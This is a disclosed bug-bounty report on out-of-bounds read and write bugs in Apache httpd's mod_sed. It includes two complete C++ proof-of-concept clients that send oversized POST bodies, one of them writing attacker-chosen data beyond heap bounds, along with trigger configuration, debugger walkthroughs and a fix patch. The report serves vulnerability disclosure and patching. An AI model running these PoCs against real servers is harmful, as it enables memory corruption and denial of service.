# Read and write beyond bounds in mod_sed

## Report Details
- **Report ID**: 1511619
- **URL**: https://hackerone.com/reports/1511619
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-03-14T19:03:51.467Z
- **Disclosed**: 2022-04-14T18:07:07.420Z

## Reporter
- **Username**: tdp3kel9g
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
This CVE consists of several bugs in mod_sed, where overflows, truncation, uses after free and a logic error can allow a remote, unauthenticated attacker to read and/or write heap locations beyond bounds. See https://github.com/apache/httpd/commit/943f57b336f264d77e5b780c82ab73daf3d14deb and https://github.com/apache/httpd/commit/e266bd09c313a668d7cca17a8b096d189148be49 for the commits that fixed the bugs. Attached are my reports to the httpd team; email me if you need additional information.

----
1. Use-after-free and truncation/overflows causing read/write beyond bounds:
```
Greetings. I have discovered a use-after-free bug in sed1.c that causes a read and/or write beyond bounds.

The bug is that dosub() (modules/filters/sed1.c) does not update |step_vars->loc1| or |step_vars->loc2| after appending to -- and thus possibly causing an expansion and reallocation of -- |genbuf| and/or |linebuf|. If a reallocation of |linebuf| occurs, this omission leaves |step_vars->loc1| and |step_vars->loc2| pointing into the old |linebuf|, causing failures later.

When control exits dosub(), then enters again on the next iteration of the loop in substitute() [1], a read and/or write beyond bounds occurs in the first call from dosub() to place(), because place()'s |al1| argument points to the new |linebuf|, while the |al2| argument points to the old |linebuf|. This causes place() to calculate a bogus |n|:

   int n = al2 - al1;

[2] and then to read and/or write beyond bounds via:

   memcpy(sp, al1, n);

The invalid access is only an incorrectly-shortened read or a read beyond bounds if |n| does not become negative and if

   unsigned int reqsize = (sp - eval->genbuf) + n + 1;

does not overflow, because in this case the resulting |genbuf| is large enough to accomodate |n| bytes of data. If, however, |n| is negative or |reqsize| overflows, |reqsize| is too small, and place() doesn't enlarge |genbuf| to accomodate the true |n|, causing the memcpy() to write beyond bounds.

Below is a POC that demonstrates the issue.

Use the POC thusly:

   1. Build httpd_bug_17h.cpp (below) using Visual Studio, modifying the server IP address (127.0.0.1 in the provided code) to be instead the IP address or DNS name of the test httpd server installation.

   2. Copy postform.htm (below) to /bug17h/postform.htm in the httpd server's ServerRoot folder.

   3. Add the httpd.conf lines (see below) into the httpd server installation's httpd.conf in a <Location> section for the ServerRoot folder.

   4. Restart httpd.

   5. Attach a debugger to httpd and set a breakpoint on grow_line_buffer ().

   6. Run httpd_bug_17h, which will send the triggering POST data to httpd.

   7. When the breakpoint fires, check |newsize|. If it is < ~33MB let control continue. When |newsize| reaches 16MB, continuing will cause execution to resume for ~15 minutes (on a relatively-old CPU).

   8. When |newsize| reaches ~33MB, examine and record the values of |eval->linebuf| and |eval->lspend|. Now step over the call to grow_buffer() and notice that it reallocates the line buffer, giving new values for |eval->linebuf| and |eval->lspend|.

   9. Step out of grow_line_buffer(), etc., back into dosub(). Step the last few lines of dosub() and notice how it leaves |step_vars|'s |loc*| members pointing to the old |linebuf|.

   10. Now set a BP on dosub()'s first call to place() and proceed.

   11. When the BP fires, step into place(). Notice that |al2| points into the old |linebuf|, whereas |al1| points into the new |linebuf|. Step through the calculation of |n| and notice how it's bogus (in my tests, it's negative). Notice how |reqsize| also becomes bogus. Step the rest of the function and notice how the memcpy() reads beyond bounds.

Note that the POC uses an expansion factor of 256 (i.e., one "0" becomes 256 "z" characters. I suspect that more realistic expansion factors will trigger the same bug. I am working on a POC to show that.)

This bug is still present in trunk. https://svn.apache.org/viewvc/httpd/httpd/trunk/modules/filters/

-------- NOTES ---------
[1] Of course, substitute()'s call to match() is also bogus, because it uses the un-updated |step_vars|, and thus reads from the old |linebuf|!

[2] The use of |int| here is also bogus and can cause truncation and subsequent invalid operation. I will submit another bug involving this and other bad uses of |int| or |unsigned int| in this module, such as in the buffer-size doubling operation in grow_buffer(), which can overflow and cause the allocation of an undersized buffer, followed by a write beyond bounds. BTW, I found this bug while pursuing a POC for that bug.

-------- httpd_bug_17h.cpp ----------------------------------------------------
#undef UNICODE

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma warning (disable:6262)
constexpr char SERVER_NAME[] = "127.0.0.1";

int ConnectSocket(const addrinfo* pAddrInfo, SOCKET* pSocket) {
    int iResult;
    *pSocket = socket(pAddrInfo->ai_family, pAddrInfo->ai_socktype, pAddrInfo->ai_protocol);
    if (*pSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        return SOCKET_ERROR;
    }

    iResult = connect(*pSocket, pAddrInfo->ai_addr, static_cast<int>(pAddrInfo->ai_addrlen));
    return iResult;
}

int __cdecl main(void)
{
    WSADATA wsaData;
    int iResult;

    SOCKET serverSocket = INVALID_SOCKET;

    struct addrinfo* result = NULL;
    struct addrinfo hints;

// Initialize Winsock

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
//    hints.ai_flags = AI_PASSIVE;

// Resolve the server's address and port

    iResult = getaddrinfo(SERVER_NAME, "80", &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

// POST 16MB of data to 127.0.0.1/bug17h/postform.htm to cause the overflow and subsequent WBB.

    iResult = ConnectSocket(result, &serverSocket);

    if (iResult == SOCKET_ERROR) {
        if (serverSocket != INVALID_SOCKET) {
            closesocket(serverSocket);
        }
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    char req1[] =
        "POST /bug17h/postform.htm HTTP/1.1\r\n"
        "Host: 127.0.0.1\r\n"
        "Accept: text/html\r\n"
        "Content-Type:  application/x-www-form-urlencoded\r\n"
        "Content-Length: 16777219\r\n"
        "Connection: close\r\n\r\n";

    const size_t sz = 16777219 + sizeof(req1) + 2; // for ending \n and 0
    char* pReq1 = new char[sz];
    memcpy(pReq1, req1, strlen(req1));
    memset(&pReq1[strlen(req1)], '0', sz - strlen(req1));
    memcpy(&pReq1[strlen(req1)], "t1=", 3);
    pReq1[sz - 2] = '\n';
    pReq1[sz - 1] = 0;

    iResult = send(serverSocket, pReq1, sz, 0);
    if (iResult == SOCKET_ERROR) {
        closesocket(serverSocket);
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

// Receive and throw away the response.

    char recvBuf[65536];

    iResult = recv(serverSocket, recvBuf, sizeof(recvBuf), 0);
    closesocket(serverSocket);

// The bug has been triggered. Cleanup and exit.

    closesocket(serverSocket);
    freeaddrinfo(result);
    WSACleanup();

    return 0;
}

-------- httpd_bug_17h.cpp ----------------------------------------------------


-------- postform.htm --------------------------------------------------------
<!DOCTYPE html>

<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta charset="utf-8" />
    <title></title>
</head>
<body>

</body>
</html>
-------- postform.htm ---------------------------------------------------------


-------- httpd.conf lines -----------------------------------------------------
<Location /bug17h>
    AddInputFilter Sed htm
    InputSed "s/0/zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz/g"
</Location>
-------- httpd.conf lines -----------------------------------------------------
```
----
2. Update to 1, above, using an expansion ratio that is more likely to be commonly used by web-accessible servers. Also observes a denial-of-service attack (but this can be mitigated by administrator's use of length constraints):
```
Greetings. I have verified that the bug described in the previous report zhbug17h can be reproduced using a more reasonable expansion factor.

In the original POC, I used expansion factor 256, via:

    <Location /bug17h>
        AddInputFilter Sed htm
        InputSed "s/0/zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz/g"
    </Location>

I have now verified that the same bug occurs with the practical expansion factor 6, via:

    <Location /bug17h>
        AddInputFilter Sed htm
        InputSed "s/0/zzzzzz/g"
    </Location>

This expansion factor is similar to what might be expected in an attack on an InputSed filter that escapes HTML entities, thus expanding, say, |"| to |&quot;| .

███

█████████
```
----
3. Overflow and write beyond bounds:
```
Greetings. This submission is a follow-on to submission zhbug17h.

grow_buffer() (modules/filters/sed1.c) can experience a write beyond bounds caused by an overflow bug. The attacker can control the exact content and amount of data written. Unlike bug zhbug17h, no particular expansion factor is needed, since the bug occurs before sed1.c's substitution code runs.

The bug is that |int spendsize| becomes negative if an attacker sends > 0x80000000 payload bytes of data to a page being processed via an InputSed "s//" rule. This occurs because the sed1.c's line buffer (|linebuf|) gets enlarged in steps to 0x80000000 bytes. When it next needs to be enlarged to hold the remaining bytes beyond 0x80000000, grow_buffer() calculates:

112:   spendsize = *spend - *buffer;

At this point, |*spend - *buffer| is 0x80000000, but |spendsize| is an |int|, so it becomes negative.

This then causes grow_buffer() to calculate a |spend| 0x80000000 bytes before the newly-allocated buffer's beginning via:

120:   *spend = *buffer + spendsize;

This updates |eval->linebuf| and |eval->lspend| via grow_line_buffer()'s call to grow_buffer():

129:   grow_buffer(eval->pool, &eval->linebuf, &eval->lspend,
130:               &eval->lsize, newsize);

When control returns to appendmem_to_linebuf(), the line

165:   memcpy(eval->lspend, sz, len);

writes attacker-provided data to an incorrect area in the heap, 0x80000000 bytes before the beginning of |eval->linebuf|. The amount of data written is controllable by the attacker, because it is exactly the amount of payload data transferred to httpd minus 0x80000000.

Attached is a POC that demonstrates the bug.

Use the POC (httpd_bug_17i.cpp, below) in the same way as the POC for bug zhbug17h, except, at step 7 et seq, do this:

   7. When the breakpoint fires, check |newsize|. When it reaches > 0x80000000 (should be 0x80001055), step into grow_buffer().

   8. Step to line 112. Manually evaluate |*spend - *buffer| and notice that it's 0x80000000.

   9. Step through line 112. Notice that |spendsize| becomes 0x80000000 (which is -2147483648).

   10. Step through line 120. Notice that |*spend| is 0x80000000 bytes *less than* |*buffer|.

   11. Step out into grow_line_buffer(). Notice how |eval->lspend| is 0x80000000 bytes less than |eval->linebuf|.

   12. Step out into appendmem_to_linebuf(). Step line 165 and notice how it copies 0x1055 bytes of the string "Attack code and data!" into the incorrect heap locations.

   13. Set a BP on appendmem_to_linebuf() and proceed. When the BP fires, step through the memcpy() and notice how it copies an additional 0xfab bytes of simulated attack code and data into the incorrect heap locations. (total attack data copied = 0x2000 bytes)

Note also that sed1.c contains several uses of |int|, probably all of which are unsafe in 64-bit builds because of potential overflows/truncations.

-------- httpd_bug_17i.cpp ----------------------------------------------------
#undef UNICODE

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma warning (disable:6262)
constexpr char SERVER_NAME[] = "127.0.0.1";

int ConnectSocket(const addrinfo* pAddrInfo, SOCKET* pSocket) {
    int iResult;
    *pSocket = socket(pAddrInfo->ai_family, pAddrInfo->ai_socktype, pAddrInfo->ai_protocol);
    if (*pSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        return SOCKET_ERROR;
    }

    iResult = connect(*pSocket, pAddrInfo->ai_addr, static_cast<int>(pAddrInfo->ai_addrlen));
    return iResult;
}

int __cdecl main(void)
{
    WSADATA wsaData;
    int iResult;

    SOCKET serverSocket = INVALID_SOCKET;

    struct addrinfo* result = NULL;
    struct addrinfo hints;

// Initialize Winsock

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
//    hints.ai_flags = AI_PASSIVE;

// Resolve the server's address and port

    iResult = getaddrinfo(SERVER_NAME, "80", &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

// POST 16MB of data to 127.0.0.1/bug17h/postform.htm to cause the overflow and subsequent WBB.

    iResult = ConnectSocket(result, &serverSocket);

    if (iResult == SOCKET_ERROR) {
        if (serverSocket != INVALID_SOCKET) {
            closesocket(serverSocket);
        }
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

#if 0 // was original bug_17h

    char req1[] =
        "POST /bug17h/postform.htm HTTP/1.1\r\n"
        "Host: 127.0.0.1\r\n"
        "Accept: text/html\r\n"
        "Content-Type:  application/x-www-form-urlencoded\r\n"
        "Content-Length: 16777219\r\n"
        "Connection: close\r\n\r\n";

    const size_t sz = 16777219 + sizeof(req1) + 2; // for ending \n and 0

#endif
    char req1[] =
        "POST /bug17h/postform.htm HTTP/1.1\r\n"
        "Host: 127.0.0.1\r\n"
        "Accept: text/html\r\n"
        "Content-Type:  application/x-www-form-urlencoded\r\n"
        "Content-Length: 2147491840\r\n"
        "Connection: close\r\n\r\n";

    const size_t sz = 0x80002000 + sizeof(req1) + 2; // for ending \n and 0
    char* pReq1 = new char[sz];
    memcpy(pReq1, req1, strlen(req1));
    memset(&pReq1[strlen(req1)], '0', sz - strlen(req1));
    memcpy(&pReq1[strlen(req1)], "t1=", 3);
    pReq1[sz - 2] = '\n';
    pReq1[sz - 1] = 0;
    const size_t backoffset = 0x2000+3;
    char* pBad = pReq1 + sz - backoffset;
    const char acd[] = "Attack code and data!";

    while (pBad <= pReq1 + sz - sizeof(acd)) {
        strcpy(pBad, "Attack code and data!");
        pBad += sizeof(acd);
    }

    WSABUF w;
    w.buf = pReq1; w.len = sz;
    DWORD bytesSent = 0;

    iResult = WSASend(serverSocket, &w, 1, &bytesSent, 0, NULL, NULL);
    if (iResult == SOCKET_ERROR) {
        closesocket(serverSocket);
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

// Receive and throw away the response.

    char recvBuf[65536];

    iResult = recv(serverSocket, recvBuf, sizeof(recvBuf), 0);
    closesocket(serverSocket);

// The bug has been triggered. Cleanup and exit.

    closesocket(serverSocket);
    freeaddrinfo(result);
    WSACleanup();

    return 0;
}

-------- httpd_bug_17i.cpp ----------------------------------------------------
```
----
4. Logic error and miscellaneous overflows probably leading to writes beyond bounds (logic-error section begins "Good! But I see some curious code...."):
```
On 2/9/22 11:15 PM, ███████ wrote:
> See notes below. Thanks for sticking with me on this rather-extended bug-smashing journey.
>
> ███
>
> On 2/9/2022 12:23 AM, █████████ wrote:
>>
>> On 2/8/22 11:07 PM, ███████ wrote:
>>> Hi. There are still some |int| bugs here, for example
>>>
>>>      1031 static apr_status_t wline(sed_eval_t *eval, char *buf, int sz)
>>>
>>> still takes an |int| size, which probably can be made to overflow via
>>>
>>>      580          rv = wline(eval, eval->linebuf, eval->lspend - eval->linebuf);
>>>
>>> or one of the other several calls to wline().
>> Fixed. Thanks. I found some further ones. Please find attached the size_t patch and the combined patch
>
> Good! But I see some curious code in sed_write_output(). Line 175, beginning "if ((status == APR_SUCCESS)...", is odd. What
> happens if |status != APR_SUCCESS|? The |else| clause on lines 183-86 that does a memcpy() of size |sz| runs. But |sz| might be
> (much) larger than the buffer allocated by the call to alloc_outbuf() on line 172, because that call allocates only |ctx->bufsize|
> bytes. So this looks like a potential write-beyond-bounds bug.
>
> 161:     remainbytes = ctx->bufsize - (ctx->curoutbuf - ctx->outbuf);
> 162:     if (sz >= remainbytes) {
> 163:         if (remainbytes > 0) {
> 164:             memcpy(ctx->curoutbuf, buf, remainbytes);
> 165:             buf += remainbytes;
> 166:             sz -= remainbytes;
> 167:             ctx->curoutbuf += remainbytes;
> 168:         }
> 169:         /* buffer is now full */
> 170:         status = append_bucket(ctx, ctx->outbuf, ctx->bufsize);
> 171:         /* old buffer is now used so allocate new buffer */
> 172:         alloc_outbuf(ctx);
> 173:         /* if size is bigger than the allocated buffer directly add to output
> 174:          * brigade */
> 175:         if ((status == APR_SUCCESS) && (sz >= ctx->bufsize)) {
> 176:             char* newbuf = apr_pmemdup(ctx->tpool, buf, sz);
> 177:             status = append_bucket(ctx, newbuf, sz);
> 178:             /* pool might get clear after append_bucket */
> 179:             if (ctx->outbuf == NULL) {
> 180:                 alloc_outbuf(ctx);
> 181:             }
> 182:         }
> 183:         else {
> 184:             memcpy(ctx->curoutbuf, buf, sz);
> 185:             ctx->curoutbuf += sz;
> 186:         }
> 187:     }
> 188:     else {
> 189:         memcpy(ctx->curoutbuf, buf, sz);
> 190:         ctx->curoutbuf += sz;
> 191:     }
> 192:     return status;
> 193: }

Another good catch. How about:

Index: modules/filters/mod_sed.c
===================================================================
--- modules/filters/mod_sed.c	(revision 1897897)
+++ modules/filters/mod_sed.c	(working copy)
@@ -168,21 +168,29 @@ static apr_status_t sed_write_output(void *dummy,
         }
         /* buffer is now full */
         status = append_bucket(ctx, ctx->outbuf, ctx->bufsize);
-        /* old buffer is now used so allocate new buffer */
-        alloc_outbuf(ctx);
-        /* if size is bigger than the allocated buffer directly add to output
-         * brigade */
-        if ((status == APR_SUCCESS) && (sz >= ctx->bufsize)) {
-            char* newbuf = apr_pmemdup(ctx->tpool, buf, sz);
-            status = append_bucket(ctx, newbuf, sz);
-            /* pool might get clear after append_bucket */
-            if (ctx->outbuf == NULL) {
+        if (status == APR_SUCCESS) {
+            /* if size is bigger than the allocated buffer directly add to output
+             * brigade */
+            if (sz >= ctx->bufsize) {
+                char* newbuf = apr_pmemdup(ctx->tpool, buf, sz);
+                status = append_bucket(ctx, newbuf, sz);
+                if (status == APR_SUCCESS) {
+                    /* old buffer is now used so allocate new buffer */
+                    alloc_outbuf(ctx);
+                }
+                else {
+                    clear_ctxpool(ctx);
+                }
+            }
+            else {
+                /* old buffer is now used so allocate new buffer */
                 alloc_outbuf(ctx);
+                memcpy(ctx->curoutbuf, buf, sz);
+                ctx->curoutbuf += sz;
             }
         }
         else {
-            memcpy(ctx->curoutbuf, buf, sz);
-            ctx->curoutbuf += sz;
+            clear_ctxpool(ctx);
         }
     }
     else {
...
```

## Impact

Possible exfiltration of private data from a web server and/or its users; injection of data and/or code into web server, possibly resulting in changes of control flow.

## Attachments
No attachments
